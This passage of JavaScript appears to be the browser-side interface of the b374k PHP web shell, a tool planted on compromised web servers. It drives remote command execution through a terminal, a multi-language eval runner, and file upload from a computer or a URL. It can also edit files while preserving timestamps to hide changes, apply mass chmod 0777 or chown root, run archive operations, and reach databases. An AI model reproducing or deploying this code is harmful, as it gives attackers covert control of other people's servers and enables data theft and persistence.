	if(type=='dot') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='newfile button'>new file</span><span class='newfolder button'>new folder</span></td></tr></table>";
	show_box(title, content);
	xpl_bind();
}

function navigate(path, showfiles){
	if(showfiles==null) showfiles = 'true';
	send_post({ cd:path, showfiles:showfiles }, function(res){
		if(res!='error'){
			splits = res.split('{[|b374k|]}');
			if(splits.length==3){
				$('#nav').html(splits[1]);
				if(showfiles=='true'){
					$('#explorer').html('');
					$('#explorer').html(splits[2]);
					sorttable.k($('#xplTable').get(0));
				}
				$('#terminalCwd').html(html_safe(get_cwd())+'&gt;');
				xpl_bind();
				window_resize();
			}
		}
	});
}

function view(path, type, preserveTimestamp){
	if(preserveTimestamp==null) preserveTimestamp = 'true';
	send_post({ viewFile: path, viewType: type, preserveTimestamp:preserveTimestamp }, function(res){
		if(res!='error'){
			$('#explorer').html('');
			$('#explorer').html(res);
			xpl_bind();
			show_tab('explorer');
			if((type=='edit')||(type=='hex')){
				editResult = (type=='edit')? $('#editResult'):$('#editHexResult');
				if(editSuccess=='success'){
					editResult.html(' ( File saved )');
				}
				else if(editSuccess=='error'){
					editResult.html(' ( Failed to save file )');
				}
				editSuccess = '';
			}
			cbox_bind('editTbl');
		}
	});
}

function view_entry(el){
	if($(el).attr('data-path')!=''){
		entry = $(el).attr('data-path');
		$('#form').append("<input type='hidden' name='viewEntry' value='"+entry+"'>");
		$('#form').submit();
		$('#form').html('');
	}
}

function ren(path){
	title = "Rename";
	content = "<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='" +path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";
	show_box(title, content);
}

function ren_go(){
	renameFile = $('.renameFile').val();
	renameFileTo = $('.renameFileTo').val();
	send_post({renameFile:renameFile, renameFileTo:renameFileTo}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
			$('.renameFile').val($('.renameFileTo').val());
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function newfolder(path){
	title = "New Folder";
	path = path + 'newfolder-' + time();
	content = "<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";
	show_box(title, content);
}

function newfolder_go(){
	newFolder = $('.newFolder').val();
	send_post({newFolder:newFolder}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function newfile(path){
	title = "New File";
	path = path + 'newfile-' + time();
	content = "<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";
	show_box(title, content);
}

function newfile_go(){
	newFile = $('.newFile').val();
	send_post({newFile:newFile}, function(res){
		if(res!='error'){
			view(newFile, 'edit');
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function viewfileorfolder(){
	title = "View File / Folder";
	content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";
	show_box(title, content);
}

function viewfileorfolder_go(){
	entry = $('.viewFileorFolder').val();
	send_post({viewFileorFolder:entry}, function(res){
		if(res!='error'){
			if(res=='file'){
				view(entry, 'auto');
				show_tab('explorer');
			}
			else if(res=='folder'){
				navigate(entry);
				show_tab('explorer');
			}
		}
	});
}

function del(path){
	title = "Delete";
	content = "<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";
	show_box(title, content);
}

function delete_go(){
	path = $('.delete').val();
	send_post({delete:path}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function find(path){
	findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
	findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
	$('#explorer').html("<div id='xplUpload'>" +findfile+'<br>'+findfolder+'</div>');
	cbox_bind('xplUpload');
}

function find_go_file(){
	find_go('file');
}

function find_go_folder(){
	find_go('folder');
}

function find_go(findType){
	findPath = (findType=='file')? $('.findfilePath').val():$('.findFolderPath').val();
	findResult = (findType=='file')? $('.findfileResult'):$('.findResult');

	findName = (findType=='file')? $('.findfileFilename').val():$('.findFoldername').val();
	findNameRegex = (findType=='file')? $('.findfileFilenameRegex').hasClass('cBoxSelected').toString():$('.findFoldernameRegex').hasClass('cBoxSelected').toString();
	findNameInsensitive = (findType=='file')? $('.findfileFilenameInsensitive').hasClass('cBoxSelected').toString():$('.findFoldernameInsensitive').hasClass('cBoxSelected').toString();

	findContent = (findType=='file')? $('.findfileContains').val():"";
	findContentRegex = (findType=='file')? $('.findfileContainsRegex').hasClass('cBoxSelected').toString():"";
	findContentInsensitive = (findType=='file')? $('.findfileContainsInsensitive').hasClass('cBoxSelected').toString():"";

	findReadable = (findType=='file')? $('.findfileReadable').hasClass('cBoxSelected').toString():$('.findWritable').hasClass('cBoxSelected').toString();
	findWritable = (findType=='file')? $('.findfileWritable').hasClass('cBoxSelected').toString():$('.findReadable').hasClass('cBoxSelected').toString();
	findExecutable = (findType=='file')? $('.findfileExecutable').hasClass('cBoxSelected').toString():$('.findExecutable').hasClass('cBoxSelected').toString();

	send_post(
		{
			findType:findType,
			findPath:findPath,
			findName:findName,
			findNameRegex:findNameRegex,
			findNameInsensitive:findNameInsensitive,
			findContent:findContent,
			findContentRegex:findContentRegex,
			findContentInsensitive:findContentInsensitive,
			findReadable:findReadable,
			findWritable:findWritable,
			findExecutable:findExecutable
		},
		function(res){
			if(res!='error'){
				findResult.html(res);
			}
		}
	);
}

function ul_go_comp(){
	ul_go('comp');
}

function ul_go_url(){
	ul_go('url');
}

function ul(path){
	ulcomputer = "<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";
	ulurl = "<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";
	content = ulcomputer + '<br>' + ulurl + "<input type='hidden' class='ul_path' value='"+path+"'>";
	$('#explorer').html(content);
	ul_add_comp();
	ul_add_url();

	$('#ulDragNDrop').on('dragenter', function(e){
		e.stopPropagation();
		e.preventDefault();
	});

	$('#ulDragNDrop').on('dragover', function(e){
		e.stopPropagation();
		e.preventDefault();
	});

	$('#ulDragNDrop').on('drop', function(e){
		e.stopPropagation();
		e.preventDefault();

		files = e.target.files || e.dataTransfer.files;
		ulResult = $('.ulDragNDropResult');
		ulResult.html('');
		$.each(files, function(i){
			if(this){
				ulType = 'DragNDrop';
				filename = this.name;

				var formData = new FormData();
				formData.append('ulFile', this);
				formData.append('ulSaveTo', get_cwd());
				formData.append('ulFilename', filename);
				formData.append('ulType', 'comp');

				entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
				ulResult.append(entry);

				if(this.size<=0){
					$('.ulProgress'+ulType+i).html('( failed )');
					$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
					$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
				}
				else{
					ul_start(formData, ulType, i);
				}
			}
		});
	});
}

function ul_add_comp(path){
	path = html_safe($('.ul_path').val());
	$('.ulcompadd').append("<tr><td style='width:144px'>File</td><td><input type='file' class='ulFileComp'></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToComp' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameComp' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr>");
}

function ul_add_url(path){
	path = html_safe($('.ul_path').val());
	$('.ulurladd').append("<tr><td style='width:144px'>File URL</td><td><input type='text' class='ulFileUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToUrl' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr>");
}

function ul_start(formData, ulType, i){
	loading_start();
	$.ajax({
		url: targeturl,
		type: 'POST',
		data: formData,
		cache: false,
		contentType: false,
		processData: false,
		xhr: function(){
			myXhr = $.ajaxSettings.xhr();
			if(myXhr.upload){
				myXhr.upload.addEventListener('progress', function(e){
					percent = Math.floor(e.loaded / e.total * 100);
					$('.ulProgress'+ulType+i).html('( '+ percent +'% )');
				}, false);
			}
			return myXhr;
		},
		success: function(res){
			if(res.match(/Warning.*POST.*Content-Length.*of.*bytes.*exceeds.*the.*limit.*of/)){
				res = 'error';
			}

			if(res=='error'){
				$('.ulProgress'+ulType+i).html('( failed )');
			}
			else{
				$('.ulRes'+ulType+i).html(res);
			}
			loading_stop();
		},
		error: function(){
			loading_stop();
			$('.ulProgress'+ulType+i).html('( failed )');
			$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
			$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
		}
	});
}

function ul_go(ulType){
	ulFile = (ulType=='comp')? $('.ulFileComp'):$('.ulFileUrl');
	ulResult = (ulType=='comp')? $('.ulCompResult'):$('.ulUrlResult');
	ulResult.html('');

	ulFile.each(function(i){
		if(((ulType=='comp')&&this.files[0])||((ulType=='url')&&(this.value!=''))){
			file = (ulType=='comp')? this.files[0]: this.value;
			filename = (ulType=='comp')? file.name: file.substring(file.lastIndexOf('/')+1);

			ulSaveTo = (ulType=='comp')? $('.ulSaveToComp')[i].value:$('.ulSaveToUrl')[i].value;
			ulFilename = (ulType=='comp')? $('.ulFilenameComp')[i].value:$('.ulFilenameUrl')[i].value;

			var formData = new FormData();
			formData.append('ulFile', file);
			formData.append('ulSaveTo', ulSaveTo);
			formData.append('ulFilename', ulFilename);
			formData.append('ulType', ulType);

			entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
			ulResult.append(entry);

			check = true;
			if(ulType=='comp'){
				check = (file.size<=0);
			}
			else check = (file=="");

			if(check){
				$('.ulProgress'+ulType+i).html('( failed )');
				$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
				$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
			}
			else{
				ul_start(formData, ulType, i);
			}
		}
	});
}

function trap_ctrl_enter(el, e, callback){
	if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
		if(callback!=null) window[callback]();
	}
	fix_tabchar(el, e);
}

function edit_save_raw(){
	edit_save('edit');
}

function edit_save_hex(){
	edit_save('hex');
}

function edit_save(editType){
	editFilename = $('#editFilename').val();
	editInput = $('#editInput').val();
	editSuccess = false;
	preserveTimestamp = 'false';
	if($('.cBox').hasClass('cBoxSelected')) preserveTimestamp = 'true';
	send_post({editType:editType,editFilename:editFilename,editInput:editInput,preserveTimestamp:preserveTimestamp},
		function(res){
		if(res!='error'){
			editSuccess = 'success';
			view(editFilename, editType, preserveTimestamp);
		}
		else editSuccess = 'error';
		}
	);
}



function mass_act(type){
	buffer = get_all_cbox_selected('xplTable', 'xpl_href');

	if((type=='cut')||(type=='copy')){
		localStorage.setItem('bufferLength', buffer.length);
		localStorage.setItem('bufferAction', type);
		$.each(buffer,function(i,v){
			localStorage.setItem('buffer_'+i, v);
		});
	}
	else if(type=='paste'){
		bufferLength = localStorage.getItem('bufferLength');
		bufferAction = localStorage.getItem('bufferAction');
		if(bufferLength>0){
			massBuffer = '';
			for(var i=0;i<bufferLength;i++){
				if((buff = localStorage.getItem('buffer_'+i))){
					massBuffer += buff + '\n';
				}
			}
			massBuffer = $.trim(massBuffer);

			if(bufferAction=='cut') title = 'move';
			else if(bufferAction=='copy') title = 'copy';

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}

	}
	else if((type=='extract (tar)')||(type=='extract (tar.gz)')||(type=='extract (zip)')){
		if(type=='extract (tar)') arcType = 'untar';
		else if(type=='extract (tar.gz)') arcType = 'untargz';
		else if(type=='extract (zip)') arcType = 'unzip';

		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'  onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">extract</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}
	else if((type=='compress (tar)')||(type=='compress (tar.gz)')||(type=='compress (zip)')){
		date = new Date();
		rand = date.getTime();
		if(type=='compress (tar)'){
			arcType = 'tar';
			arcFilename = rand+'.tar';
		}
		else if(type=='compress (tar.gz)'){
			arcType = 'targz';
			arcFilename = rand+'.tar.gz';
		}
		else if(type=='compress (zip)'){
			arcType = 'zip';
			arcFilename = rand+'.zip';
		}

		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">compress</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}
	else if(type!=''){
		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;
			line = '';
			if(type=='chmod') line = "<tr><td class='colFit'>chmod</td><td><input class='massValue' type='text' value='0777' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			else if(type=='chown') line = "<tr><td class='colFit'>chown</td><td><input class='massValue' type='text' value='root' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			else if(type=='touch'){
				var now = new Date();
				line = "<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='"+now.toGMTString()+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			}

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+type+"');\">"+title+"</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}

	$('.cBoxSelected').removeClass('cBoxSelected');
	xpl_update_status();
}

function mass_act_go_tar(){
	mass_act_go('tar');
}

function mass_act_go_targz(){
	mass_act_go('targz');
}

function mass_act_go_zip(){
	mass_act_go('zip');
}

function mass_act_go_untar(){
	mass_act_go('untar');
}

function mass_act_go_untargz(){
	mass_act_go('untargz');
}

function mass_act_go_unzip(){
	mass_act_go('unzip');
}

function mass_act_go_paste(){
	mass_act_go('paste');
}

function mass_act_go_chmod(){
	mass_act_go('chmod');
}

function mass_act_go_chown(){
	mass_act_go('chown');
}

function mass_act_go_touch(){
	mass_act_go('touch');
}

function mass_act_go(massType){
	massBuffer = $.trim($('.massBuffer').val());
	massPath = get_cwd();
	massValue = '';
	if(massType=='paste'){
		bufferLength = localStorage.getItem('bufferLength');
		bufferAction = localStorage.getItem('bufferAction');
		if(bufferLength>0){
			massBuffer = '';
			for(var i=0;i<bufferLength;i++){
				if((buff = localStorage.getItem('buffer_'+i))){
					massBuffer += buff + '\n';
				}
			}
			massBuffer = $.trim(massBuffer);
			if(bufferAction=='copy') massType = 'copy';
			else if(bufferAction=='cut') massType = 'cut';
		}
	}
	else if((massType=='chmod')||(massType=='chown')||(massType=='touch')){
		massValue = $('.massValue').val();
	}
	else if((massType=='tar')||(massType=='targz')||(massType=='zip')){
		massValue = $('.massValue').val();
	}
	else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')){
		massValue = $('.massValue').val();
	}


	if(massBuffer!=''){
		send_post({massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue }, function(res){
			if(res!='error'){
				$('.boxresult').html(res+' Operation(s) succeeded');
			}
			else $('.boxresult').html('Operation(s) failed');
			navigate(get_cwd());
		});
	}
}

function xpl_update_status(){
	totalSelected = $('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;
	if(totalSelected==0) $('.xplSelected').html('');
	else $('.xplSelected').html(', '+totalSelected+' item(s) selected');
}


function xpl_bind(){
	$('.navigate').off('click');
	$('.navigate').on('click', function(e){
		path = xpl_href($(this));
		navigate(path);
		hide_box();
	});

	$('.navbar').off('click');
	$('.navbar').on('click', function(e){
		path = $(this).attr('data-path');
		navigate(path);
		hide_box();
	});

	$('.newfolder').off('click');
	$('.newfolder').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		newfolder(path);
	});

	$('.newfile').off('click');
	$('.newfile').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		newfile(path);
	});

	$('.del').off('click');
	$('.del').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		del(path);
	});

	$('.view').off('click');
	$('.view').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'auto');
		hide_box();
	});

	$('.hex').off('click');
	$('.hex').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'hex');
	});

	$('#viewFullsize').off('click');
	$('#viewFullsize').on('click', function(e){
		src = $('#viewImage').attr('src');
		window.open(src);
	});

	$('.edit').off('click');
	$('.edit').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'edit');
		hide_box();
	});

	$('.ren').off('click');
	$('.ren').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		ren(path);
	});

	$('.action').off('click');
	$('.action').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'file');
	});

	$('.actionfolder').off('click');
	$('.actionfolder').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'dir');
	});

	$('.actiondot').off('click');
	$('.actiondot').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'dot');
	});

	$('.dl').off('click');
	$('.dl').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		$('#form').append("<input type='hidden' name='download' value='"+path+"'>");
		$('#form').submit();
		$('#form').html('');
		hide_box();
	});

	$('.ul').off('click');
	$('.ul').on('click', function(e){
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		ul(path);
		hide_box();
	});

	$('.find').off('click');
	$('.find').on('click', function(e){
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		find(path);
		hide_box();
	});

	$('#massAction').off('click');
	$('#massAction').on('change', function(e){
		type = $('#massAction').val();
		mass_act(type);
		$('#massAction').val('Action');
	});

	cbox_bind('xplTable','xpl_update_status');
}

function xpl_href(el){
	return el.parent().parent().attr('data-path');
}

function multimedia(path){
	var a = $('video').get(0);
	send_post({multimedia:path}, function(res){
		a.src = res;
	});
	hide_box();
}

$('#terminalInput').on('keydown', function(e){
	if(e.keyCode==13){
		cmd = $('#terminalInput').val();
		terminalHistory.push(cmd);
		terminalHistoryPos = terminalHistory.length;
		if(cmd=='clear'||cmd=='cls'){
			$('#terminalOutput').html('');
		}
		else if((path = cmd.match(/cd(.*)/i)) || (path = cmd.match(/^([a-z]:)$/i))){
			path = $.trim(path[1]);
			navigate(path);
		}
		else if(cmd!=''){
			send_post({ terminalInput: cmd }, function(res){
				cwd = html_safe(get_cwd());
				res = '<span class=\'strong\'>'+cwd+'&gt;</span>'+html_safe(cmd)+ '\n' + res+'\n';
				$('#terminalOutput').append(res);
				bottom = $(document).height()-$(window).height();
				$(window).scrollTop(bottom);
			});
		}
		$('#terminalInput').val('');
		setTimeout("$('#terminalInput').focus()",100);
	}
	else if(e.keyCode==38){
		if(terminalHistoryPos>0){
			terminalHistoryPos--;
			$('#terminalInput').val(terminalHistory[terminalHistoryPos]);
			if(terminalHistoryPos<0) terminalHistoryPos = 0;
		}
	}
	else if(e.keyCode==40){
		if(terminalHistoryPos<terminalHistory.length-1){
			terminalHistoryPos++;
			$('#terminalInput').val(terminalHistory[terminalHistoryPos]);
			if(terminalHistoryPos>terminalHistory.length) terminalHistoryPos = terminalHistory.length;
		}
	}
	fix_tabchar(this, e);
});

function eval_go(){
	evalType = $('#evalType').val();
	evalInput = $('#evalInput').val();
	evalOptions = $('#evalOptions').val();
	evalArguments = $('#evalArguments').val();

	if(evalOptions=='Options/Switches') evalOptions = '';
	if(evalArguments=='Arguments') evalArguments = '';

	if($.trim(evalInput)!=''){
		send_post({ evalInput:evalInput, evalType:evalType, evalOptions:evalOptions, evalArguments:evalArguments },
			function(res){
				if(res!='error'){
					splits = res.split('{[|b374k|]}');
					if(splits.length==2){
						output = splits[0]+"<hr>"+splits[1];
						$('#evalOutput').html(output);
					}
					else{
						$('#evalOutput').html(res);
					}
				}
			}
		);
	}
}

function eval_init(){
	if((evalSupported = localStorage.getItem('evalSupported'))){
		eval_bind();
		output("eval : "+evalSupported);
		evalReady = true;
	}
	else{
		send_post({evalGetSupported:"evalGetSupported"}, function(res){
			evalReady = true;
			if(res!="error"){
				localStorage.setItem('evalSupported', res);
				evalSupported = res;
				eval_bind();
				output("eval : "+evalSupported);
			}
		});
	}
}

function eval_bind(){
	if((evalSupported!=null)&&(evalSupported!='')){
		splits = evalSupported.split(",");
		$.each(splits, function(i, k){
			$('#evalType').append("<option>"+k+"</option>");
		});
	}
	$('#evalType').on('change', function(e){
		if($('#evalType').val()=='php'){
			$('#evalAdditional').hide();
		}
		else{
			$('#evalAdditional').show();
		}
	});
	$('#evalOptions').on('focus', function(e){
		options = $('#evalOptions');
		if(options.val()=='Options/Switches') options.val('');
	});
	$('#evalOptions').on('blur', function(e){
		options = $('#evalOptions');
		if($.trim(options.val())=='') options.val('Options/Switches');
	});
	$('#evalArguments').on('focus', function(e){
		args = $('#evalArguments');
		if(args.val()=='Arguments') args.val('');
	});
	$('#evalArguments').on('blur', function(e){
		args = $('#evalArguments');
		if($.trim(args.val())=='') args.val('Arguments');
	});

	$('#evalInput').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			eval_go();
		}
		fix_tabchar(this, e);
	});
}
Zepto(function($){
	$('#decodeStr').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			decode_go();
		}
		fix_tabchar(this, e);
	});
});

function decode_go(){
	decodeStr = $('#decodeStr').val();
	send_post({decodeStr:decodeStr}, function(res){
		if(res!='error'){
			$('#decodeResult').html('');
			$('#decodeResult').html(res);
		}
	});
}


Zepto(function($){
	db_init();

});

var dbSupported = "";
var dbPageLimit = 50;

function db_init(){
	if((dbSupported = localStorage.getItem('db_supported'))){
		db_bind();
		output("db : "+dbSupported);
		db_add_supported();
	}
	else{
		send_post({dbGetSupported:""}, function(res){
			if(res!="error"){
				localStorage.setItem('dbSupported', res);
				dbSupported = res;
				db_bind();
				output("db : "+dbSupported);
				db_add_supported();
			}
		});
	}
}

function db_add_supported(){
	splits = dbSupported.split(",");
	$.each(splits, function(i, k){
		$('#dbType').append("<option>"+k+"</option>");
	});
}

function db_bind(){
	$('#dbType').on('change', function(e){
		type = $('#dbType').val();
		if((type=='odbc')||(type=='pdo')){
			$('.dbHostLbl').html('DSN / Connection String');
			$('.dbUserRow').show();
			$('.dbPassRow').show();
			$('.dbPortRow').hide();

		}
		else if((type=='sqlite')||(type=='sqlite3')){
			$('.dbHostLbl').html('DB File');
			$('.dbUserRow').hide();
			$('.dbPassRow').hide();
			$('.dbPortRow').hide();

		}
		else{
			$('.dbHostLbl').html('Host');
			$('.dbUserRow').show();
			$('.dbPassRow').show();
			$('.dbPortRow').show();
		}
	});

	$('#dbQuery').on('focus', function(e){
		if($('#dbQuery').val()=='You can also press ctrl+enter to submit'){
			$('#dbQuery').val('');
		}
	});
	$('#dbQuery').on('blur', function(e){
		if($('#dbQuery').val()==''){
			$('#dbQuery').val('You can also press ctrl+enter to submit');
		}
	});
	$('#dbQuery').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			db_run();
		}
	});
}

function db_nav_bind(){
	dbType = $('#dbType').val();
	$('.boxNav').off('click');
	$('.boxNav').on('click', function(){
		$(this).next().toggle();
	});

	$('.dbTable').off('click');
	$('.dbTable').on('click', function(){
		type = $('#dbType').val();
		table = $(this).html();
		db = $(this).parent().parent().parent().prev().html();
		db_query_tbl(type, db, table, 0, dbPageLimit);
	});
}

function db_connect(){
	dbType = $('#dbType').val();
	dbHost = $('#dbHost').val();
	dbUser = $('#dbUser').val();
	dbPass = $('#dbPass').val();
